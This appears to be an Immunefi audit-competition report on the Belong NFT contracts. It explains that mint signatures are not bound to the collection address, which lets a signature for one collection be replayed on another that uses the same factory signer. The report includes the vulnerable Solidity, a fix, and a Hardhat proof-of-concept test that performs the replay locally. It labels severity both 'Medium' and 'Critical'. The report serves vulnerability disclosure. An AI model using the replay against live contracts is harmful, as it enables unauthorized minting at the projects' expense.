# 57427 sc medium mint signatures are not bound to a collection which makes cross collection replay possible under a shared signer

**Submitted on Oct 26th 2025 at 05:43:15 UTC by @Rhaydden for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57427
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

### Issue description

The backend signs mint payloads that include the receiver, token details, and chainId, but not the collection’s address. Any collection that trusts the same factory signer will accept that signature.

In dynamic price signature: <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/utils/SignatureVerifier.sol#L221-L232>

```solidity
function checkDynamicPriceParameters(address signer, address receiver, DynamicPriceParameters calldata params)
    external
    view
{
    require(
        signer.isValidSignatureNow(
            keccak256(abi.encodePacked(receiver, params.tokenId, params.tokenUri, params.price, block.chainid)),
            params.signature
        ),
        InvalidSignature()
    );
}
```

Also in static price signature:

```solidity
function checkStaticPriceParameters(address signer, address receiver, StaticPriceParameters calldata params)
    external
    view
{
    require(
        signer.isValidSignatureNow(
            keccak256(abi.encodePacked(receiver, params.tokenId, params.tokenUri, params.whitelisted, block.chainid)),
            params.signature
        ),
        InvalidSignature()
    );
}
```

Albeit, AccessToken uses a global factory signer for checks, but does not bind the signature to `address(this)`:

```solidity
// contracts/v2/tokens/AccessToken.sol
factoryParameters.signerAddress.checkStaticPriceParameters(receiver, paramsArray[i]);
// ...
factoryParameters.signerAddress.checkDynamicPriceParameters(receiver, paramsArray[i]);
```

The signer is global per factory and shared by all collections:

```solidity
// contracts/v2/platform/Factory.sol
struct FactoryParameters {
    address platformAddress;
    address signerAddress; // shared across AccessToken collections
    // ...
}
```

Because `address(this)` (verifying contract) is not part of the signed payload, a signature intended for Collection A can be replayed on Collection B (same signer, same chain).

### Impact

Critical - Unauthorized minting of NFTs.

Mint permissions intended for one collection can be reused on another.

### Recommended mitigation steps

Consider including the collection address in the signed hash for mint parameters:

* Static:

```solidity
// add address(this)
keccak256(abi.encodePacked(address(this), receiver, params.tokenId, params.tokenUri, params.whitelisted, block.chainid))
```

* Dynamic:

```solidity
// add address(this)
keccak256(abi.encodePacked(address(this), receiver, params.tokenId, params.tokenUri, params.price, block.chainid))
```

## Proof of Concept

Attach this poc to a new file `test/v2/tokens/accessToken.replay.test.ts`:

```ts
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from 'chai';
import EthCrypto from 'eth-crypto';

import {
  deployAccessToken,
  deployAccessTokenImplementation,
  deployCreditTokenImplementation,
  deployFactory,
  deployRoyaltiesReceiverV2Implementation,
  deployVestingWalletImplementation,
  TokenMetadata,
} from '../../../helpers/deployFixtures';
import { deploySignatureVerifier } from '../../../helpers/deployLibraries';
import { deployMockTransferValidatorV2 } from '../../../helpers/deployMockFixtures';
import { StaticPriceParametersStruct } from '../../../typechain-types/contracts/v2/tokens/AccessToken';

describe('PoC: Cross-Collection Replay', () => {
  const NATIVE_CURRENCY_ADDRESS = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';
  const NFT_721_BASE_URI = 'poc://token';
  const ethPurchasePrice = ethers.utils.parseEther('0.02');

  const AccessTokenAMetadata: TokenMetadata = {
    name: 'AccessTokenA',
    symbol: 'AT-A',
    uri: 'contractURI/AccessTokenA',
  };

  const AccessTokenBMetadata: TokenMetadata = {
    name: 'AccessTokenB',
    symbol: 'AT-B',
    uri: 'contractURI/AccessTokenB',
  };

  async function fixture() {
    const [owner, creator, , , charlie] = await ethers.getSigners();
    const signer = EthCrypto.createIdentity();

    const signatureVerifier = await deploySignatureVerifier();
    const validator = await deployMockTransferValidatorV2();
    const accessTokenImplementation = await deployAccessTokenImplementation(signatureVerifier.address);
    const royaltiesReceiverV2Implementation = await deployRoyaltiesReceiverV2Implementation();
    const creditTokenImplementation = await deployCreditTokenImplementation();
    const vestingWallet = await deployVestingWalletImplementation();

    const implementations = {
      accessToken: accessTokenImplementation.address,
      creditToken: creditTokenImplementation.address,
      royaltiesReceiver: royaltiesReceiverV2Implementation.address,
      vestingWallet: vestingWallet.address,
    };

    const factory = await deployFactory(
      owner.address,
      signer.address,
      signatureVerifier.address,
      validator.address,
      implementations,
    );

    const { accessToken: accessTokenA } = await deployAccessToken(
      AccessTokenAMetadata,
      ethPurchasePrice,
      ethPurchasePrice.div(2),
      signer,
      creator,
      factory,
      ethers.constants.HashZero,
    );

    const { accessToken: accessTokenB } = await deployAccessToken(
      AccessTokenBMetadata,
      ethPurchasePrice,
      ethPurchasePrice.div(2),
      signer,
      creator,
      factory,
      ethers.constants.HashZero,
    );

    const chainId = (await ethers.provider.getNetwork()).chainId;

    return { owner, creator, charlie, signer, factory, accessTokenA, accessTokenB, chainId };
  }

  it('replays a static-price mint signature from collection A to collection B', async () => {
    const { creator, charlie, signer, accessTokenA, accessTokenB, chainId } = await loadFixture(fixture);

    
    const tokenId = 777;
    const message = EthCrypto.hash.keccak256([
      { type: 'address', value: charlie.address },
      { type: 'uint256', value: tokenId },
      { type: 'string', value: NFT_721_BASE_URI },
      { type: 'bool', value: false },
      { type: 'uint256', value: chainId },
    ]);
    const signature = EthCrypto.sign(signer.privateKey, message);

    
    await accessTokenA.connect(creator).mintStaticPrice(
      charlie.address,
      [
        {
          tokenId,
          tokenUri: NFT_721_BASE_URI,
          whitelisted: false,
          signature,
        } as StaticPriceParametersStruct,
      ],
      NATIVE_CURRENCY_ADDRESS,
      ethPurchasePrice,
      { value: ethPurchasePrice },
    );

    expect(await accessTokenA.ownerOf(tokenId)).to.eq(charlie.address);

    
    await accessTokenB.connect(creator).mintStaticPrice(
      charlie.address,
      [
        {
          tokenId,
          tokenUri: NFT_721_BASE_URI,
          whitelisted: false,
          signature,
        } as StaticPriceParametersStruct,
      ],
      NATIVE_CURRENCY_ADDRESS,
      ethPurchasePrice,
      { value: ethPurchasePrice },
    );

    expect(await accessTokenB.ownerOf(tokenId)).to.eq(charlie.address);
  });
});
```

Run without mainnet forking (local only) using:

```
NO_FORK=1 \
LEDGER_ADDRESS=0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \
PK=0x1111111111111111111111111111111111111111111111111111111111111111 \
pnpm hardhat test test/v2/tokens/accessToken.replay.test.ts
```

Logs:

```
PoC: Cross-Collection Replay
  ✔ replays a static-price mint signature from collection A to collection B (254ms)

1 passing
```

The test passes because both collections accept the same signature from the same signer.
